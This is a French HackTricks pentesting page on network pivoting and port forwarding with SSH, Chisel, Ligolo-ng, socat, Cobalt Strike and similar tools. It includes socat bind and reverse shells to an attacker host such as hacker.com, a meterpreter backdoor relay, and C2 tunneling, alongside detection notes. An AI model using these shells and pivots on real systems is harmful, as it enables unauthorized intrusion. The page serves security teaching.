# Tunneling et redirection de ports

{{#include ../banners/hacktricks-training.md}}

## Conseil Nmap

> [!WARNING]
> La prise en charge des proxies par Nmap est limitée aux connexions TCP et n'affecte pas les scans ping, de ports ou de détection du système d'exploitation. Lorsque le scanner se trouve derrière un proxy SOCKS, **désactivez la découverte d'hôtes** (`-Pn`) et utilisez un **scan TCP connect** (`-sT`).<sup>[[5]](#references)</sup>

## **Bash**

**Hôte -> Jump -> InternalA -> InternalB**

La commande finale utilise les options `-u` et `-i` d'Evil-WinRM pour identifier le compte et l'hôte WinRM ; le port WinRM par défaut est 5985.<sup>[[4]](#references)</sup>

```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```

## **SSH**

OpenSSH peut transférer des connexions X11, des ports TCP arbitraires et des sockets de domaine Unix via son canal chiffré.<sup>[[6]](#references)</sup>

Connexion graphique SSH (X)

`-Y` active le transfert X11 de confiance et `-C` demande la compression des données transférées.<sup>[[6]](#references)</sup>

```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```

### Remote Port2Port

Ouvrir un nouveau port dans le serveur SSH --> Autre port

Le forwarding Remote (`-R`) écoute sur le serveur SSH et se connecte au côté local ; l’adresse de liaison explicite détermine quelles interfaces peuvent accéder à cet écouteur.<sup>[[6]](#references)</sup>

```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```

### Port2Port

Port local --> Hôte compromis (SSH) --> Third_box:Port

La redirection locale (`-L`) écoute sur le client et se connecte à la destination depuis le côté serveur SSH.<sup>[[6]](#references)</sup>

```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```

### Port2hostnet (proxychains)

Port local --> Hôte compromis (SSH) --> N’importe où

Le forwarding dynamique (`-D`) crée un listener SOCKS4/SOCKS5 local dont les connexions sont ouvertes depuis le côté distant.<sup>[[6]](#references)</sup>

```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```

### Multi-hop avec ProxyJump

`-J`/`ProxyJump` se connecte à la cible via un ou plusieurs hôtes de rebond séparés par des virgules. Les options de transfert s’appliquent toujours à la connexion SSH finale : l’écouteur SOCKS ci-dessous ouvre donc des connexions vers des destinations depuis `internal-target`, et non depuis le premier bastion. Cela évite de se connecter à un hôte de rebond pour y lancer un second client SSH.<sup>[[6]](#references)</sup>

```bash
# Reach the final SSH server through two bastions
ssh -J user1@jump1:22,user2@jump2:22 user3@internal-target

# Create a local SOCKS proxy whose connections exit from internal-target
ssh -J user1@jump1,user2@jump2 -N -D 127.0.0.1:1080 user3@internal-target
```

Les options propres à l’hôte pour les machines de rebond doivent être placées dans `~/.ssh/config` ; la configuration en ligne de commande destinée à la destination n’est pas automatiquement appliquée aux hôtes intermédiaires.<sup>[[6]](#references)</sup>

### Reverse Port Forwarding

Cette technique est utile pour obtenir des reverse shells depuis des hôtes internes en passant par une DMZ jusqu’à votre hôte :

Le paramètre `GatewayPorts` du serveur détermine si un remote forward peut être lié à une adresse autre que l’interface loopback ; sa valeur par défaut est `no`.<sup>[[7]](#references)</sup>

```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```

### VPN-Tunnel

Cet exemple basé sur `root` crée des périphériques tunnel sur les deux hôtes. Le serveur doit autoriser le transfert tun et le compte sélectionné doit avoir accès au périphérique tun ; `PermitRootLogin yes` permet notamment d’utiliser le compte `root` ici.<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`

```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```

Activer le forwarding côté serveur

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```

Définir une nouvelle route côté client

```
route add -net 10.0.0.0/16 gw 1.1.1.1
```

> [!NOTE]
> **Sécurité – attaque Terrapin (CVE-2023-48795)**  
> OpenSSH 9.6 a ajouté une extension strict-KEX pour contrer l’attaque de Terrapin visant l’intégrité du transport initial. Mettez à jour les deux pairs lorsque c’est possible et suivez les recommandations des fournisseurs pour les anciennes implémentations, plutôt que de supposer qu’un canal redirigé est protégé par la version seule.<sup>[[8]](#references)</sup>

## SSHUTTLE

Vous pouvez **tunneler** tout le **trafic** vers un **sous-réseau** via **ssh**, en passant par un hôte.\
Par exemple, rediriger tout le trafic à destination de 10.10.10.0/24

`sshuttle` fournit un proxy transparent via SSH et permet de sélectionner des sous-réseaux ainsi qu’une commande SSH personnalisée, comme indiqué ci-dessous.<sup>[[9]](#references)</sup>

```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```

Se connecter avec une clé privée

```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```

## Meterpreter

Le `portfwd` de Metasploit prend en charge le transfert local et distant, tandis que son module de proxy SOCKS est conçu pour fonctionner avec les routes de session ou `autoroute` et écoute par défaut sur le port 1080 dans ces exemples.<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

Port local --> Hôte compromis (session active) --> Troisième_machine:Port

```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```

### SOCKS

```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

Une autre méthode :

```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

## Cobalt Strike

Le Beacon de Cobalt Strike peut relayer des connexions SOCKS4a/SOCKS5 via un Beacon ; `rportfwd` ouvre une écoute sur l’hôte compromis, tandis que `rportfwd_local` initie la connexion vers la destination depuis le client Cobalt Strike.<sup>[[13]](#references)[[14]](#references)</sup>

### Proxy SOCKS

Ouvrez un port sur le Team Server, sur les interfaces qui doivent acheminer le trafic via le Beacon.<sup>[[13]](#references)</sup>

```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```

### rPort2Port

> [!WARNING]
> Dans ce cas, le **port est ouvert sur l’hôte Beacon**, et non sur le Team Server. Le trafic est envoyé au Team Server, puis de là vers l’hôte:port indiqué.<sup>[[14]](#references)</sup>

```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```

Le manuel de reverse forwarding indique le comportement suivant :<sup>[[14]](#references)</sup>

- Le reverse port forward de Beacon est conçu pour **tunneler le trafic vers le Team Server, et non pour relayer le trafic entre des machines individuelles**.
- Le trafic est **tunnelé dans le trafic C2 de Beacon**, y compris les liens P2P.
- Les ports élevés permettent généralement d’éviter les restrictions liées aux ports privilégiés, mais les règles de l’OS cible et les processus qui écoutent déjà sur ces ports s’appliquent toujours.

### rPort2Port local

> [!WARNING]
> Dans ce cas, le **port est ouvert sur l’hôte Beacon**, et non sur le Team Server, et le **trafic est envoyé au client Cobalt Strike** (et non au Team Server), puis de là vers l’hôte:port indiqué.<sup>[[14]](#references)</sup>

```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```

## BOFScale - tailnet dans le processus, derrière un CDN

[BOFScale](https://github.com/NetSPI/BOFscale) exécute un overlay Tailscale modifié dans un implant C2 Windows, sans installer de pilote TUN ni de service. Ses trois composants sont un BOF-PE `tailscaled` asynchrone en CGo `c-shared`, un petit BOF-PE C++ qui communique avec l'API locale, et un pont TCP-vers-SOCKS5 asynchrone `socksportfwd`.<sup>[[53]](#references)[[54]](#references)</sup>

### TS2021 et DERP compatibles avec les CDN

Tailscale utilise normalement des mises à niveau HTTP propriétaires pour le canal de contrôle TS2021 basé sur Noise et le relais DERP. BOFScale conserve ces flux d'octets, mais les transporte dans des WebSockets RFC 6455, au moyen de `Sec-WebSocket-Protocol: ts2021` ou `derp`. Ainsi, un serveur Headscale/DERP contrôlé par l'opérateur peut se trouver derrière un CDN qui n'accepte que les mises à niveau WebSocket standard. Le client modifié réessaie TS2021 sur WebSockets après une réponse HTTP `500`, réessaie DERP après une réponse HTTP `426` et configure le connecteur WebSocket DERP pour respecter la configuration du proxy hôte ; le BOF définit `TS_DEBUG_DERP_WS_CLIENT=1` pour ignorer la première tentative, connue pour échouer.<sup>[[53]](#references)[[54]](#references)</sup>

Le CDN et le proxy d'origine doivent préserver les mises à niveau WebSocket pour `/ts2021` et `/derp`, transférer `/key` en HTTP ordinaire et désactiver les délais d'expiration internes en lecture/écriture, car les sessions de relais peuvent rester ouvertes indéfiniment. La configuration Headscale fournie active `verify_clients`, ne publie que la carte DERP intégrée de l'opérateur et laisse `derp.urls` vide pour empêcher le basculement vers des relais exploités par Tailscale.<sup>[[53]](#references)[[54]](#references)</sup>

### Démon dans le processus et contrôle par named pipe

Sauf remplacement, le point d'entrée du BOF démarre `tailscaled` avec `-tun=userspace-networking`, `-state mem:` et `-no-logs-no-support`, puis crée un pipe nommé avec un UUID. Il redirige stdout/stderr de Go via un pipe système vers l'API de sortie de Beacon : le démon complet et le runtime Go restent ainsi en mémoire, mais l'état et les logs ne sont pas écrits dans un répertoire Tailscale.<sup>[[53]](#references)[[54]](#references)</sup>

Le client léger reproduit l'API locale HTTP/1.0 de Tailscale via ce pipe. Il ouvre le pipe avec `SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION`, car la couche `safesocket` du démon usurpe l'identité du client du pipe, envoie `Tailscale-Cap: 125` et associe l'API locale aux opérations `up`, `down`, `status`, de publication de routes et d'arrêt.<sup>[[53]](#references)[[54]](#references)</sup>

> [!WARNING]
> Ne déchargez pas un BOF-PE Go mappé manuellement après avoir demandé l'arrêt du démon : les goroutines du runtime et du garbage collector peuvent continuer à s'exécuter depuis une mémoire désallouée par le loader. Exécutez `tailscaled` dans un processus sacrifiable et terminez ce processus pour effectuer le nettoyage final.<sup>[[54]](#references)</sup>

### Faire transiter le trafic initié par l'hôte via SOCKS5 en mode utilisateur

Les connexions entrantes du tailnet et les routes de sous-réseau publiées fonctionnent dans la pile réseau en mode utilisateur, mais les processus ordinaires de l'hôte compromis n'ont pas de route système vers l'overlay. `socksportfwd` écoute donc sur un port TCP accessible depuis la victime, négocie SOCKS5 `NO AUTH` avec le listener `0.0.0.0:1080` du démon, envoie une requête `CONNECT` vers une destination du tailnet et relaie les données dans les deux sens de manière asynchrone. Si la cible est un nom MagicDNS, il utilise `ATYP_DOMAIN`, ce qui permet à `tailscaled` de résoudre le nom sans l'exposer au résolveur Windows.<sup>[[53]](#references)[[54]](#references)</sup>

Un flux opérateur minimal est présenté ci-dessous ; le nœud opérateur et l'implant doivent tous deux utiliser les binaires modifiés, car Tailscale standard ne peut pas traverser cette configuration CDN.<sup>[[53]](#references)[[54]](#references)</sup>

```bash
HEADSCALE_HOSTNAME=<cdn-hostname> docker compose up
# Start tailscaled as an asynchronous BOF and copy its printed pipe name
tailscaled
tailscale --socket '\\.\pipe\<uuid>' up --auth-key <key> --login-server https://<cdn-hostname>
tailscale --socket '\\.\pipe\<uuid>' set --advertise-routes <victim-cidr>
socksportfwd --t <operator-magicdns-name> --tp 8888 --p 8888
```

Le forward local peut séparer le listener d’authentification apparent de l’outil de relay : forcer une machine à s’authentifier sur le port bindé de l’hôte compromis, transférer la connexion via le tailnet vers `ntlmrelayx`, puis la relayer vers AD CS, LDAP, HTTP, SMB ou une autre cible compatible. Voir [WebDAV NTLM coercion](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#webdav-auth-coercion--credential-validation-via-davclntdlldavsetcookie) et [ESC8 relay to AD CS](../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8) pour les étapes spécifiques à la vulnérabilité ; BOFScale ne fournit que le transport.<sup>[[54]](#references)</sup>

### Détection

Recherchez la combinaison plutôt qu’un seul indicateur peu fiable : un runtime Go dans un processus qui n’est normalement pas basé sur Go, un pipe UUID avec un SDDL permissif `D:(A;;GA;;;WD)`, un listener SOCKS inattendu sur `0.0.0.0:1080` et des WebSockets TLS de longue durée vers des adresses CDN. Avec l’inspection TLS, signalez `Sec-WebSocket-Protocol: derp` ou `ts2021` lorsque le processus propriétaire n’est pas un service `tailscaled` autorisé. Les règles `bofscale.yar` du dépôt fournissent des signatures mémoire pour les trois composants BOF-PE.<sup>[[53]](#references)[[54]](#references)</sup>

## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Le projet fournit des points de terminaison de web tunnel tels que `tunnel.aspx`, `tunnel.ashx`, `tunnel.jsp` et `tunnel.php` ; téléversez un point de terminaison pris en charge avant de démarrer le proxy local.<sup>[[15]](#references)</sup>

```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```

## Chisel

Vous pouvez le télécharger depuis la page des versions de [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Chisel transporte le trafic TCP/UDP via HTTP à l’aide d’une connexion protégée par SSH ; utilisez des versions client/serveur compatibles et vérifiez la syntaxe des commandes de la version sélectionnée.<sup>[[16]](#references)</sup>

### socks

```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```

### Port forwarding

```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```

## wstunnel

[`wstunnel`](https://github.com/erebe/wstunnel) transporte des redirections statiques ou dynamiques via WebSocket, HTTP/2 ou WebTransport (HTTP/3 sur QUIC). Les versions actuelles prennent en charge TCP, UDP, les sockets Unix, stdio, SOCKS5, le proxy HTTP et les écouteurs de proxy transparent Linux, en modes forward et reverse.<sup>[[52]](#references)</sup>

### Pivot SOCKS5 reverse

Exécutez le serveur sur l’attaquant et faites en sorte que le pivot établisse une connexion sortante avec `-R`. Dans ce sens, l’écouteur SOCKS5 est créé sur le **serveur**, tandis que les connexions demandées proviennent du réseau du **client/pivot**.<sup>[[52]](#references)</sup>

```bash
# Attacker: use a certificate valid for pivot.example
wstunnel server --tls-certificate cert.pem --tls-private-key key.pem wss://0.0.0.0:443

# Pivot: expose an attacker-side, loopback-only SOCKS5 listener
wstunnel client --tls-verify-certificate \
  -R 'socks5://127.0.0.1:1080' wss://pivot.example:443

# Attacker
proxychains nmap -n -Pn -sT -p 445,3389 10.10.10.0/24
```

Un reverse static forward utilise le même sens. Par exemple, la commande suivante expose `10.10.10.20:445`, tel qu’il est atteint par le pivot, sur le port loopback `8445` de l’attaquant :<sup>[[52]](#references)</sup>

```bash
wstunnel client --tls-verify-certificate \
  -R 'tcp://127.0.0.1:8445:10.10.10.20:445' wss://pivot.example:443
```

### Détails sur l’egress et le transport

- Ajoutez `-p http://user:pass@proxy:8080` au client pour passer par un proxy HTTP explicite. Utilisez `socks5h://127.0.0.1:1080` dans des clients tels que `curl` (ou activez la résolution DNS via le proxy dans l’application) afin que les noms internes soient résolus au-delà du tunnel au lieu d’être divulgués au résolveur local.<sup>[[52]](#references)</sup>
- `wss://` sélectionne WebSocket protégé par TLS. Un client `https://` sélectionne HTTP/2, mais la mise en tampon ou la conversion HTTP/1 par les reverse proxies/CDN interrompt souvent le flux bidirectionnel ; exposez directement le serveur wstunnel lorsque vous testez ce mode.<sup>[[52]](#references)</sup>
- `wts://` sélectionne WebTransport sur QUIC. Démarrez le serveur avec `--enable-webtransport` (ou une URL d’écoute `wts://`) et autorisez UDP sur le port d’écoute. Ce mode ne peut pas traverser un proxy HTTP `CONNECT` conventionnel, car ce proxy transporte du TCP.<sup>[[52]](#references)</sup>

> [!WARNING]
> Le projet upstream déconseille de considérer son certificat auto-signé intégré comme une protection de la confidentialité. Préférez un certificat personnalisé valide avec `--tls-verify-certificate` (ou mTLS), gardez les écouteurs de proxy sur loopback sauf si un accès distant est souhaité, et tunnelisez des protocoles déjà sécurisés lorsque la confidentialité est importante.<sup>[[52]](#references)</sup>

## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

Le guide de démarrage rapide de Ligolo-ng décrit une interface TUN sur le proxy, la validation de l’empreinte du certificat de l’agent et la configuration des routes vers le réseau tunnelisé.<sup>[[17]](#references)</sup>

### Tunneling

```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```

### Liaison et écoute de l’agent

Ligolo-ng peut ajouter des listeners sur l’agent qui redirigent vers une adresse côté proxy, et sa plage réservée `240.0.0.0/4` peut être routée pour accéder aux services locaux de l’agent.<sup>[[18]](#references)[[19]](#references)</sup>

```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```

### Accéder aux ports locaux de l’agent

```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```

## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Rpivot démarre le tunnel inversé depuis la victime et expose un proxy SOCKS4 sur l’adresse de bouclage de l’attaquant ; son README documente également les identifiants de proxy NTLM et les options de hash.<sup>[[20]](#references)</sup>

```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```

Pivot via **proxy NTLM**

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```

## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Socat combine des types d’adresses tels que `TCP-LISTEN`, `EXEC`, `SOCKS4A`, `OPENSSL` et `PROXY` ; les exemples ci-dessous associent ces points de terminaison documentés.<sup>[[21]](#references)</sup>

### Bind shell

```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```

### Reverse shell

```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```

### Port2Port

```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```

### Port2Port via socks

```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```

### Meterpreter via Socat SSL

```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```

Vous pouvez traverser un **proxy non authentifié** avec le type d’adresse `PROXY` documenté de socat en exécutant cette ligne à la place de la dernière dans la console de la victime.<sup>[[21]](#references)</sup>

```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```

[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### Tunnel SSL Socat

**/bin/sh console**

Créez des certificats des deux côtés : client et serveur

```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```

### Remote Port2Port

Connecter le port SSH local (22) au port 443 de l’hôte de l’attaquant.

```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```

## Plink.exe

Plink est l’outil de connexion en ligne de commande de PuTTY, avec des options de transfert SSH similaires à celles de `ssh`.<sup>[[22]](#references)</sup>

Utilisez `-P` en majuscule pour le port SSH. `-pw` est conservé pour des raisons de compatibilité, mais expose le mot de passe dans la liste des processus ; privilégiez l’authentification par clé ou `-pwfile` lorsque c’est possible.<sup>[[22]](#references)[[23]](#references)</sup>

Comme ce binaire sera exécuté sur la machine victime et qu’il s’agit d’un client SSH, ouvrez le service et le port SSH pour la connexion inversée ; la commande suivante utilise `-R` pour transférer un port accessible localement vers la machine de l’attaquant.<sup>[[22]](#references)</sup>

```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```

## Windows netsh

### Port2Port

Utilisez un contexte disposant des autorisations requises par l’hôte lors de la création ou de la modification de règles `portproxy` persistantes. Microsoft documente ci-dessous les formes `add`, `show` et `delete` de `v4tov4`.<sup>[[24]](#references)</sup>

```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```

### Déployer `portproxy` via une tâche planifiée

Lorsque des identifiants administratifs sont disponibles, l’exécution à distance du Planificateur de tâches peut installer une règle de redirection native sans téléverser de relais dédié. Par exemple, [Impacket `atexec`](../windows-hardening/lateral-movement/atexec.md) peut faire écouter un pivot sur TCP/443 et relayer la connexion vers un service SMB interne.<sup>[[57]](#references)[[58]](#references)</sup>

```bash
atexec.py 'DOMAIN/USER:PASSWORD'@<PIVOT> \
  'netsh interface portproxy add v4tov4 listenport=443 connectaddress=10.0.12.101 connectport=445'
```

La règle est persistante : énumérez-la avec `netsh interface portproxy show v4tov4` et supprimez-la explicitement après les tests. N’oubliez pas que `portproxy` assure uniquement la redirection ; le pare-feu de l’hôte doit également autoriser le port en écoute.<sup>[[24]](#references)</sup>

## SocksOverRDP & Proxifier

Vous devez disposer d’un **accès RDP au système**.\
Téléchargez :

SocksOverRDP utilise les canaux virtuels dynamiques de Remote Desktop pour transporter une connexion SOCKS5 via une session RDP existante ; le plugin client écoute sur `127.0.0.1:1080`, tandis que le composant serveur s’exécute sur la cible RDP.<sup>[[25]](#references)</sup>

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Cet outil utilise les `Dynamic Virtual Channels` (`DVC`) de la fonctionnalité Remote Desktop Service de Windows. Les DVC sont chargés du **tunneling des paquets via la connexion RDP**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Sur votre ordinateur client, chargez **`SocksOverRDP-Plugin.dll`** comme ceci :

```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```

Nous pouvons maintenant **nous connecter** à la **victime** via **RDP** avec **`mstsc.exe`**. Un **message** devrait nous indiquer que le **plugin SocksOverRDP est activé** et qu’il va **écouter** sur **127.0.0.1:1080**.

**Connectez-vous** via **RDP**, puis téléversez et exécutez le binaire `SocksOverRDP-Server.exe` sur la machine victime :

```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```

Maintenant, vérifiez sur votre machine (attaquant) que le port 1080 est en écoute :

```
netstat -antb | findstr 1080
```

Vous pouvez maintenant utiliser [**Proxifier**](https://www.proxifier.com/) pour faire passer le trafic par ce port.<sup>[[26]](#references)</sup>

### Recherche de tunnels sur les canaux virtuels RDP

[`rdp2tcp`](../network-services-pentesting/pentesting-rdp.md#rdp-virtual-channel-tunneling) est un autre tunnel de canal virtuel RDP ; son nom de canal par défaut est `rdp2tcp`, mais un opérateur peut en choisir un autre.<sup>[[56]](#references)</sup> La création et la fermeture des canaux sont enregistrées dans `Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational` sous les ID d’événement **132** et **148**. Recherchez `rdp2tcp` et les noms de canaux rares ou aléatoires, puis comparez-les aux canaux attendus tels que `XPSRD`, `cliprdr` et `Microsoft::Windows::RDS::DisplayControl`.<sup>[[58]](#references)</sup>

## Faire passer les applications GUI Windows par un proxy

Vous pouvez faire naviguer les applications GUI Windows via un proxy avec [**Proxifier**](https://www.proxifier.com/).<sup>[[26]](#references)</sup>\
Dans **Profile -> Proxy Servers**, ajoutez l’IP et le port du serveur SOCKS.\
Dans **Profile -> Proxification Rules**, ajoutez le nom du programme à proxifier et les connexions vers les IP que vous souhaitez proxifier ; les règles Proxifier peuvent correspondre aux applications, aux hôtes cibles et aux ports.<sup>[[27]](#references)</sup>

## Tunnel via un proxy NTLM

L’outil mentionné précédemment, **Rpivot**, peut relayer le trafic via un proxy qui s’authentifie avec NTLM. **OpenVPN** peut également acheminer le trafic via un tel proxy s’il est configuré avec un fichier d’authentification et la méthode NTLMv2 ; il s’agit d’un passage par le proxy, et non d’un contournement de l’authentification du proxy.<sup>[[20]](#references)[[28]](#references)</sup>

```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```

### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlm s’authentifie auprès de proxies NTLM en amont, expose des écouteurs locaux et peut mapper un port de tunnel local vers un service de destination ; les clients peuvent ensuite utiliser ce port local.<sup>[[29]](#references)</sup>\
Par exemple, pour rediriger le port 443

```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```

Maintenant, si vous configurez par exemple le service **SSH** de la victime pour écouter sur le port 443, vous pouvez vous y connecter via le port 2222 de l'attaquant.<sup>[[29]](#references)</sup>\
Vous pouvez également utiliser un **meterpreter** qui se connecte à localhost:443, tandis que l'attaquant écoute sur le port 2222.<sup>[[29]](#references)</sup>

## YARP

